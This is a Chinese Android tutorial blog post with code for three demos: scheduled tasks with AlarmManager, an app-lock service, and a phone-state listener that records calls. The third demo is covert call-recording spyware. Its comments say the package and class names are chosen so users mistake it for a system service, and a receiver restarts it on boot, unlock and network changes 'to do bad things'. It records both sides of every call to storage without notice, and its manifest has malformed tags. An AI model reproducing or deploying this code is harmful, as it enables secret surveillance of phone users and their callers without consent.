| Markdown版本笔记 | 我的GitHub首页 | 我的博客 | 我的微信 | 我的邮箱 |  
| :------------: | :------------: | :------------: | :------------: | :------------: |  
| [MyAndroidBlogs][Markdown] | [baiqiantao][GitHub] | [baiqiantao][博客] | bqt20094 | baiqiantao@sina.com |  
  
[Markdown]:https://github.com/baiqiantao/MyAndroidBlogs  
[GitHub]:https://github.com/baiqiantao  
[博客]:http://www.cnblogs.com/baiqiantao/  
  
***  
目录  
===  

- [定时任务 AlarmManager + IntentService](#定时任务-AlarmManager--IntentService)
	- [AlarmManagerActivity](#AlarmManagerActivity)
	- [BackgroundService](#BackgroundService)
- [应用锁 UsageStatsManager ActivityManager AppOpsManager](#应用锁-UsageStatsManager-ActivityManager-AppOpsManager)
	- [使用到的依赖库](#使用到的依赖库)
	- [清单文件](#清单文件)
	- [启动Activity](#启动Activity)
	- [拦截提示Activity](#拦截提示Activity)
	- [拦截服务](#拦截服务)
	- [Application](#Application)
	- [工具类](#工具类)
- [电话状态监听 通话录音 TelephonyManager PhoneStateListener MediaRecorder](#电话状态监听-通话录音-TelephonyManager-PhoneStateListener-MediaRecorder)
	- [MainActivity](#MainActivity)
	- [SystemService](#SystemService)
	- [BatteryChangedReceiver](#BatteryChangedReceiver)
	- [MyPhoneStateListener](#MyPhoneStateListener)
	- [SuperReceiver](#SuperReceiver)
	- [清单文件](#清单文件)
  
# 定时任务 AlarmManager + IntentService  
## AlarmManagerActivity  
```java  
public class AlarmManagerActivity extends ListActivity {  
    private AlarmManager manager;  
    private int count;  
      
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        String[] array = {  
            "设置一次性定时后台服务",  
            "设置一个周期性执行的定时服务",  
            "取消AlarmManager的定时服务"};  
        setListAdapter(new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, array));  
          
        manager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);  
    }  
      
    @Override  
    protected void onListItemClick(ListView l, View v, int position, long id) {  
        switch (position) {  
            case 0:  
                setOnceAlarm();  
                break;  
            case 1:  
                setRepeatAlarm();  
                break;  
            case 2:  
                Intent intent = new Intent(this, BackgroundService.class);  
                manager.cancel(PendingIntent.getService(this, 0, intent, 0));  
                break;  
        }  
    }  
  
        /*AlarmManager中定义的type有五个可选值：  
     ELAPSED_REALTIME  闹钟在睡眠状态下不可用，如果在系统休眠时闹钟触发，它将不会被传递，直到下一次设备唤醒；使用相对系统启动开始的时间  
     ELAPSED_REALTIME_WAKEUP  闹钟在手机睡眠状态下会唤醒系统并执行提示功能，使用相对时间  
     RTC  闹钟在睡眠状态下不可用，该状态下闹钟使用绝对时间，即当前系统时间  
     RTC_WAKEUP  表示闹钟在睡眠状态下会唤醒系统并执行提示功能，使用绝对时间  
     POWER_OFF_WAKEUP  表示闹钟在手机【关机】状态下也能正常进行提示功能，用绝对时间，但某些版本并不支持！ */  
      
    /*设置在triggerAtTime时间启动的定时服务。该方法用于设置一次性闹钟*/  
    private void setOnceAlarm() {  
        Intent intent = getIntent("onceAlarm");  
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 0);  
          
        //表示闹钟(首次)执行时间。相对于系统启动时间，Returns milliseconds since boot, including time spent in sleep  
        long triggerAtTime = SystemClock.elapsedRealtime() + 3 * 1000;  
          
        //设置定时任务。CPU一旦休眠(比如关机状态)，Timer中的定时任务就无法运行，而Alarm具有唤醒CPU的功能  
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);  
    }  
      
    /*设置一个周期性执行的定时服务，参数表示首次执行时间和间隔时间*/  
    private void setRepeatAlarm() {  
        Intent intent = getIntent("repeatAlarm" + (count++));//这里传给Intent的值一旦设定后就不会再改变  
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 0);  
          
        //相对于1970……的绝对时间，Returns milliseconds since boot, including time spent in sleep.  
        long triggerAtTime = System.currentTimeMillis() + 3 * 1000;  
          
        //时间间隔至少为60秒  
        manager.setRepeating(AlarmManager.RTC_WAKEUP, triggerAtTime, 60 * 1000, pendingIntent);  
        /*Frequent alarms are bad for battery life. As of API 22, the AlarmManager will override  
         near-future and high-frequency alarm requests, delaying the alarm at least 【5 seconds】 into the future  
         and ensuring that the repeat interval is at least 【60 seconds】.  
         If you really need to do work sooner than 5 seconds, post a delayed message or runnable to a Handler.*/  
    }  
      
    @NonNull  
    private Intent getIntent(String name) {  
        Intent intent = new Intent(this, BackgroundService.class);  
        intent.putExtra("name", name);  
        return intent;  
    }  
}  
```  
  
## BackgroundService  
```java  
public class BackgroundService extends IntentService {  
    public BackgroundService() {  
        super("工作线程");  
    }  
      
    @Override  
    public void onCreate() {  
        super.onCreate();  
        Log.i("bqt", "onCreate");  
    }  
      
    @Override  
    public void onDestroy() {  
        super.onDestroy();  
        Log.i("bqt", "onDestroy");  
    }  
      
    @Override  
    protected void onHandleIntent(@Nullable Intent intent) {  
        Log.i("bqt", "onHandleIntent，是否主线程：" + (Looper.myLooper() == Looper.getMainLooper()));  
        String name = intent != null && intent.hasExtra("name") ? intent.getStringExtra("name") : "null";  
        Log.i("bqt", "开始执行耗时任务，" + name);  
        SystemClock.sleep(3 * 1000);  
        Log.i("bqt", "耗时任务完成");  
    }  
      
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i("bqt", "onStartCommand");  
        return super.onStartCommand(intent, flags, startId);  
    }  
}  
```  
  
# 应用锁 UsageStatsManager ActivityManager AppOpsManager  
[demo地址](https://github.com/baiqiantao/AppLock)  
  
## 使用到的依赖库  
```  
implementation 'io.reactivex.rxjava2:rxjava:2.2.1'  
implementation 'io.reactivex.rxjava2:rxandroid:2.0.2'  
implementation 'com.github.tbruyelle:rxpermissions:0.10.2'  
```  
  
## 清单文件  
```XML  
<?xml version="1.0" encoding="utf-8"?>  
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
          xmlns:tools="http://schemas.android.com/tools"  
          package="com.bqt.lock">  
  
    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>  
    <uses-permission  
        android:name="android.permission.PACKAGE_USAGE_STATS"  
        tools:ignore="ProtectedPermissions"/>  
  
    <application  
        android:name=".MyApplication"  
        android:allowBackup="false"  
        android:icon="@drawable/icon"  
        android:label="应用锁"  
        android:theme="@android:style/Theme.Holo.Light.NoActionBar"  
        tools:ignore="GoogleAppIndexingWarning">  
        <activity android:name=".MainActivity">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"/>  
  
                <category android:name="android.intent.category.LAUNCHER"/>  
            </intent-filter>  
        </activity>  
        <activity  
            android:name=".LockActivity"  
            android:launchMode="singleInstance"/>  
  
        <service android:name=".AppService"/>  
    </application>  
  
</manifest>  
```  
  
## 启动Activity  
```java  
public class MainActivity extends FragmentActivity {  
      
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        TextView textView = new TextView(this);  
        textView.setBackgroundColor(Color.DKGRAY);  
        textView.setTextColor(Color.WHITE);  
        textView.setGravity(Gravity.CENTER);  
        textView.setText("欢迎使用应用锁");  
        textView.setTextSize(26);  
        setContentView(textView);  
        checkPermission();  
    }  
      
    private static final int REQUEST_PACKAGE_USAGE_STATS = 1101;  
      
    @SuppressLint("CheckResult")  
    private void checkPermission() {  
        new RxPermissions(this)  
                .request(Manifest.permission.KILL_BACKGROUND_PROCESSES)  
                .subscribe(granted -> {  
                    Log.i("bqt", "是否有清后台应用的权限：" + granted);  
                    requestUsage();  
                });  
    }  
      
    private void requestUsage() {  
        if (!AppUtils.isUseGranted()) {//引导用户开启"Apps with usage access"权限  
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {  
                Toast.makeText(this, "需要开启查看应用使用情况的权限", Toast.LENGTH_SHORT).show();  
                startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), REQUEST_PACKAGE_USAGE_STATS);  
            }  
        }  
    }  
      
    @Override  
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
        if (requestCode == REQUEST_PACKAGE_USAGE_STATS) {  
            checkPermission();  
        }  
    }  
}  
```  
  
## 拦截提示Activity  
```java  
public class LockActivity extends Activity {  
    private TextView tv_name;  
    private ImageView iv_icon;  
      
    @Override  
    protected void onCreate(@Nullable Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_lock);  
          
        tv_name = findViewById(R.id.tv_name);  
        iv_icon = findViewById(R.id.iv_icon);  
        init(getIntent());  
    }  
      
    @Override  
    protected void onNewIntent(Intent intent) {  
        super.onNewIntent(intent);  
        Log.i("bqt", "onNewIntent");  
        init(intent);  
    }  
      
    private void init(Intent intent) {  
        String packageName = intent.getStringExtra("package");  
        if (packageName != null) {  
            try {  
                PackageManager manager = getPackageManager();  
                String name = manager.getPackageInfo(packageName, 0).applicationInfo.loadLabel(manager).toString();  
                Drawable icon = manager.getPackageInfo(packageName, 0).applicationInfo.loadIcon(manager);  
                tv_name.setText("禁止使用：" + name);  
                iv_icon.setBackgroundDrawable(icon);  
            } catch (Exception e) {  
                e.printStackTrace();  
            }  
        }  
    }  
}  
```  
  
## 拦截服务  
```java  
public class AppService extends Service {  
    private Disposable disposable;  
      
    @Nullable  
    @Override  
    public IBinder onBind(Intent intent) {  
        return null;  
    }  
      
    @Override  
    public void onCreate() {  
        super.onCreate();  
    }  
      
    @Override  
    public int onStartCommand(Intent startIntent, int flags, int startId) {  
        disposable = Flowable.interval(200, TimeUnit.MILLISECONDS)//每200毫秒查询一次  
                .throttleFirst(200, TimeUnit.MILLISECONDS)//取300毫米内的最后一次  
                .subscribe(aLong -> {  
                    String packageName = AppUtils.getTopPackageName();  
                    if (WhiteListUtils.isInWhiteList(packageName)) {  
                        Log.i("bqt", "白名单应用，不拦截" + packageName);  
                    } else if (packageName == null) {  
                        Log.i("bqt", "无法获取到包名，取消拦截");  
                        stopSelf();  
                    } else {  
                        Log.i("bqt", "拦截" + packageName);  
                        Intent intent = new Intent(this, LockActivity.class);  
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
                        intent.putExtra("package", packageName);  
                        startActivity(intent);  
                        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);  
                        if (am != null) am.killBackgroundProcesses(packageName);  
                        disposable.dispose();  
                    }  
                }, Throwable::printStackTrace);  
        return super.onStartCommand(startIntent, flags, startId);  
    }  
      
    @Override  
    public void onDestroy() {  
        super.onDestroy();  
        if (disposable != null) {  
            disposable.dispose();  
        }  
    }  
}  
```  
  
## Application  
```java  
public class MyApplication extends Application {  
    public static MyApplication instance = new MyApplication();  
      
    @Override  
    public void onCreate() {  
        super.onCreate();  
        instance = this;  
          
        registerActivityLifecycleCallbacks(new ActivityLifecycleCallbacks() {  
            private int mFinalCount;  
              
            @Override  
            public void onActivityCreated(Activity activity, Bundle savedInstanceState) {  
              
            }  
              
            @Override  
            public void onActivityStarted(Activity activity) {  
                mFinalCount++;  
                if (mFinalCount == 1) {//如果mFinalCount ==1，说明是从后台到前台  
                    Log.i("bqt", "从后台到前台：" + activity.getClass().getSimpleName());  
                    stopService(new Intent(activity, AppService.class));  
                }  
            }  
              
            @Override  
            public void onActivityResumed(Activity activity) {  
              
            }  
              
            @Override  
            public void onActivityPaused(Activity activity) {  
              
            }  
              
            @Override  
            public void onActivityStopped(Activity activity) {  
                mFinalCount--;  
                if (mFinalCount == 0) {//如果mFinalCount ==0，说明是从前台到后台  
                    Log.i("bqt", "从前台到后台：" + activity.getClass().getSimpleName());  
                    startService(new Intent(activity, AppService.class));  
                }  
            }  
              
            @Override  
            public void onActivitySaveInstanceState(Activity activity, Bundle outState) {  
              
            }  
              
            @Override  
            public void onActivityDestroyed(Activity activity) {  
              
            }  
        });  
    }  
}  
```  
  
## 工具类  
工具类1：获取全局上下文  
```java  
public class App {  
    public static Application getApp() {  
        return MyApplication.instance;  
    }  
}  
```  
  
工具类2：判断权限、获取包名  
```java  
public class AppUtils {  
      
    /**  
     * 判断查看历史记录的权利是否给予app  
     */  
    public static boolean isUseGranted() {  
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {  
            AppOpsManager appOps = (AppOpsManager) App.getApp().getSystemService(Context.APP_OPS_SERVICE);  
            if (appOps != null) {  
                int mode = appOps.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), App.getApp().getPackageName());  
                return mode == AppOpsManager.MODE_ALLOWED;  
            } else {  
                return false;  
            }  
        } else {  
            return true;  
        }  
    }  
      
    /**  
     * 获取顶层的activity的包名  
     */  
    public static String getTopPackageName() {  
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {  
            return getTopPackageNameLol();  
        } else {  
            return getTopPackageNameKitr();  
        }  
    }  
      
    private static String getTopPackageNameLol() {  
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {  
            UsageStatsManager manager = (UsageStatsManager) App.getApp().getSystemService(Context.USAGE_STATS_SERVICE);  
            if (manager == null) return null;  
              
            long time = System.currentTimeMillis();  
            List<UsageStats> statsList = manager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 20, time);  
            if (statsList != null) {  
                SortedMap<Long, UsageStats> mySortedMap = new TreeMap<>();  
                for (UsageStats usageStats : statsList) {  
                    mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);  
                }  
                if (!mySortedMap.isEmpty()) {  
                    return mySortedMap.get(mySortedMap.lastKey()).getPackageName();  
                }  
            }  
        }  
        return null;  
    }  
      
    private static String getTopPackageNameKitr() {  
        ActivityManager activityManager = (ActivityManager) App.getApp().getSystemService(Context.ACTIVITY_SERVICE);  
        if (activityManager != null) {  
            ComponentName topActivity = activityManager.getRunningTasks(1).get(0).topActivity;  
            return topActivity.getPackageName();  
        } else {  
            return null;  
        }  
    }  
}  
```  
  
工具类3：设置白名单  
```java  
public class WhiteListUtils {  
    private static final String[] WHITE_LIST = new String[]{  
            App.getApp().getPackageName(),//当前应用  
            "com.android.settings",//设置界面  
            "com.android.systemui",//系统功能，包括：三星最近任务  
            "com.android.deskclock",//系统时钟  
            "com.miui.home",//小米桌面  
            "com.miui.securitycenter",//小米安全中心设置  
            "com.sec.android.app.launcher",//三星桌面  
            //"com.tencent.mm",//微信  
            //"com.tencent.qq",//QQ  
            //"com.tencent.qqlite",//QQ轻聊版  
            //"com.tencent.mobileqqi",//QQ国际版  
    };  
      
    public static boolean isInWhiteList(String packageName) {  
        for (String s : WHITE_LIST) {  
            if (s.equalsIgnoreCase(packageName)) {  
                return true;  
            }  
        }  
        return false;  
    }  
}  
```  
  
# 电话状态监听 通话录音 TelephonyManager PhoneStateListener MediaRecorder  
[Demo地址](https://github.com/baiqiantao/ServiceDemo3.git)   
  
电话管理器 电话状态监听 通话过程录音 TelephonyManager PhoneStateListener MediaRecorder 电池状态广播  
  
## MainActivity  
```java  
public class MainActivity extends ListActivity {  
    private BatteryChangedReceiver receiver;  
    static final String SERVICE_NAME = "com.android.service.SystemService";  
      
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        String[] mData = {"开启服务",  
                "停止服务",  
                "判断服务是否正在运行",  
                "动态注册电量变化的广播接收者",  
                "取消注册"};  
        setListAdapter(new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, Arrays.asList(mData)));  
    }  
      
    @Override  
    protected void onListItemClick(ListView l, View v, int position, long id) {  
        switch (position) {  
            case 0:  
                startService(new Intent(this, SystemService.class));  
                break;  
            case 1:  
                stopService(new Intent(this, SystemService.class));  
                break;  
            case 2:  
                Toast.makeText(this, "服务是否在运行:" + isServiceWorked(this, SERVICE_NAME), Toast.LENGTH_SHORT).show();  
                break;  
            case 3:  
                if (receiver == null) receiver = new BatteryChangedReceiver();  
                registerReceiver(receiver, getIntentFilter());//电池的状态改变广播只能通过动态方式注册  
                break;  
            case 4:  
                if (receiver != null) {  
                    unregisterReceiver(receiver);  
                    receiver = null;  
                } else Toast.makeText(this, "你还没有注册", Toast.LENGTH_SHORT).show();  
                  
                break;  
        }  
    }  
      
    private IntentFilter getIntentFilter() {  
        IntentFilter filter = new IntentFilter();  
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);//This is a sticky broadcast containing the charging state, level, and other information about the battery.  
        filter.addAction(Intent.ACTION_BATTERY_LOW);//Indicates low battery condition on the device. This broadcast corresponds to the "Low battery warning" system dialog.  
        filter.addAction(Intent.ACTION_BATTERY_OKAY);//This will be sent after ACTION_BATTERY_LOW once the battery has gone back up to an okay state.  
        return filter;  
    }  
      
    public static boolean isServiceWorked(Context context, String serviceName) {  
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);  
        ArrayList<RunningServiceInfo> services = (ArrayList<RunningServiceInfo>) manager.getRunningServices(Integer.MAX_VALUE);  
        for (int i = 0; i < services.size(); i++) {  
            if (services.get(i).service.getClassName().equals(serviceName)) return true;  
        }  
        return false;  
    }  
}  
```  
  
## SystemService  
```java  
/**  
 * 一个监听用户电话状态的服务<br/>  
 * 为防止服务被关闭，在onDestroy中我们又启动了另一个完全一样的服务，这样便可达到永远无法关闭服务的目的。<br/>  
 * 为混淆用户，我们故意使用包名com.android.service及类名SystemService，让用户以为这是系统后台服务！  
 */  
public class SystemService extends Service {  
    private PhoneStateListener listener;  
      
    @Override  
    public IBinder onBind(Intent intent) {  
        return null;  
    }  
      
    @Override  
    public void onCreate() {  
        TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);  
        listener = new MyPhoneStateListener();  
        manager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);  
        Log.i("bqt", "onCreate");  
        super.onCreate();  
    }  
      
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i("bqt", "onStartCommand");  
        return START_STICKY;//当service因内存不足被kill，当内存又有的时候，service又被重新创建  
    }  
      
    @Override  
    public void onDestroy() {  
        Log.i("bqt", "onDestroy");  
        //startService(new Intent(this, SystemService.class));//在onDestroy中再启动本服务，但是用户杀进程时不会调用onDestroy方法  
        // 取消电话的监听  
        ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).listen(listener, PhoneStateListener.LISTEN_NONE);  
        listener = null;  
        super.onDestroy();  
    }  
}  
```  
  
## BatteryChangedReceiver  
```java  
/**  
 * 电量改变的广播接收者  
 */  
public class BatteryChangedReceiver extends BroadcastReceiver {  
      
    @Override  
    public void onReceive(Context context, Intent intent) {  
        Toast.makeText(context, "Action：" + intent.getAction(), Toast.LENGTH_SHORT).show();  
        switch (intent.getAction()) {  
            case Intent.ACTION_BATTERY_CHANGED://"android.intent.action.BATTERY_CHANGED"  
                Log.i("battery", "==============电池电量改变：BATTERY_CHANGED_ACTION");  
                Log.i("battery", "当前电压=" + intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1));  
                Log.i("battery", "健康状态=" + intent.getIntExtra(BatteryManager.EXTRA_HEALTH, -1));//如BATTERY_HEALTH_COLD  
                Log.i("battery", "电量最大值=" + intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1));  
                Log.i("battery", "当前电量=" + intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1));  
                Log.i("battery", "充电电源类型=" + intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1));  
                Log.i("battery", "充电状态=" + intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1));//如BATTERY_STATUS_CHARGING 正在充电  
                Log.i("battery", "电池类型=" + intent.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY));//比如，对于锂电池是Li-ion  
                Log.i("battery", "电池温度=" + intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1));  
                break;  
            case Intent.ACTION_BATTERY_LOW:// "android.intent.action.BATTERY_LOW"  
                Log.i("battery", "电池电量低：ACTION_BATTERY_LOW");  
                break;  
            case Intent.ACTION_BATTERY_OKAY:// "android.intent.action.BATTERY_OKAY"  
                Log.i("battery", "电池已经从电量低恢复为正常：ACTION_BATTERY_OKAY");  
                break;  
            default:  
                break;  
        }  
    }  
}  
```  
  
## MyPhoneStateListener  
```java  
/**  
 * 服务中所激活的电话状态监听器，在通话状态通过MediaRecorder录音  
 */  
public class MyPhoneStateListener extends PhoneStateListener {  
    private String phoneNumber; // 来电号码  
    private static final String FILE_PATH = Environment.getExternalStorageDirectory().getPath() + "/bqt_callRecords";  
    private MediaRecorder mediaRecorder;  
      
    @Override  
    public void onCallStateChanged(int state, String incomingNumber) {  
        super.onCallStateChanged(state, incomingNumber);  
        Log.i("bqt", "state=" + state + "   Number=" + incomingNumber);  
        switch (state) {  
            case TelephonyManager.CALL_STATE_RINGING://响铃状态，拿到来电号码  
                phoneNumber = incomingNumber;//只有这里能拿到来电号码，在CALL_STATE_OFFHOOK状态是拿不到来电号码的  
                break;  
            case TelephonyManager.CALL_STATE_OFFHOOK://通话状态，开始录音  
                record();  
                break;  
            case TelephonyManager.CALL_STATE_IDLE://空闲状态，释放资源  
                release();  
                break;  
        }  
    }  
      
    private void record() {  
        if (mediaRecorder == null) mediaRecorder = new MediaRecorder();  
        if (phoneNumber == null) phoneNumber = "null_";  
        File directory = new File(FILE_PATH);  
        if (!directory.exists()) directory.mkdir();  
        String data = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss", Locale.getDefault()).format(new Date());  
        File file = new File(FILE_PATH + File.separator + phoneNumber + data);  
        //if (!file.exists()) file.createNewFile();  
          
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);//指定录音机的声音源  
        //MIC只获取自己说话的声音；VOICE_CALL双方的声音都可以录取，但是由于外国法律的限制，某些大牌手机不支持此参数  
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);//设置录制文件的输出格式，如AMR-NB，MPEG-4等  
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);//设置音频的编码，如AAC，AMR-NB等  
        mediaRecorder.setOutputFile(file.getAbsolutePath());//存储路径  
        try {  
            mediaRecorder.prepare();//准备，一定要放在设置后、开始前，否则会产生异常  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        mediaRecorder.start();  
        Log.i("bqt", "开始录音！");  
    }  
      
    private void release() {  
        if (mediaRecorder != null) {  
            mediaRecorder.stop();  
            //mediaRecorder.reset(); //重设  
            mediaRecorder.release();  
            mediaRecorder = null;  
        }  
        Log.i("bqt", "结束录音！");  
    }  
}  
```  
  
## SuperReceiver  
```java  
/**  
 * 在一个超级广播接收者中启动服务  
 * 为防止服务被关闭，我们为此BroadcastReceiver注册了很多广播事件的，只要有一个广播被我们获取，我们就启动后台服务干坏事  
 */  
public class SuperReceiver extends BroadcastReceiver {  
      
    @Override  
    public void onReceive(Context context, Intent intent) {  
        context.startService(new Intent(context, SystemService.class));  
        Log.i("bqt", intent.getAction());  
    }  
}  
```  
  
## 清单文件  
```xml  
<?xml version="1.0" encoding="utf-8"?>  
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
          package="com.android.service">  
    <!-- 访问电话状态 -->  
    <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses>  
    <!-- 允许程序监视、修改或放弃拨打电话 -->  
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"></uses>  
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses>  
    <!-- 挂载、反挂载外部文件系统 -->  
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"></uses>  
    <!-- 录音权限 -->  
    <uses-permission android:name="android.permission.RECORD_AUDIO"></uses>  
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"></uses>  
  
    <application  
        android:theme="@style/AppTheme">  
        <activity  
            android:name=".MainActivity"  
            android:label="@string/app_name">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"></action>  
  
                <category android:name="android.intent.category.LAUNCHER"></category>  
            </intent-filter>  
        </activity>  
  
        <receiver android:name=".SuperReceiver">  
            <intent-filter>  
                <action android:name="android.intent.action.BOOT_COMPLETED"></action>  
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"></action>  
                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"></action>  
                <!-- 唤醒机器、解锁时发出，屏幕SCREEN_ON和SCREEN_OFF的广播只能通过代码动态的形式注册 -->  
                <action android:name="android.intent.action.USER_PRESENT"></action>  
            </intent-filter>  
        </receiver>  
  
        <service  
            android:name=".SystemService"  
            android:process=":process1"></service>  
    </application>  
  
</manifest>  
```  
  
2019-3-12  
